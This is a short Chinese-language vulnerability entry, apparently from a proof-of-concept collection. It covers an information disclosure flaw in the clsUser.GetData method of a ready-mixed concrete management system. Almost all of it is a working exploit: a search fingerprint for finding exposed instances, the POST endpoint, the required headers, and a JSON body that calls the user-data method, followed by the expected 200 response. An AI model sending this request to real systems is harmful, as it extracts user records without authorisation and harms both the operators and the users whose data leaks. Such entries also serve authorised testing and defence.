# 预拌砼综合管理系统clsUser.GetData存在敏感信息泄露漏洞

- **系统**：预拌砼综合管理系统clsUser.GetData　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST //Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id= HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: application/json`　`AppStateCount: 1`

**请求体 / payload**
```
AppState0:
Content-Length: 174
{"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"DeptId,UserId,CreateDate DESC\"}}"]]}
```
- **预期**：200　|　—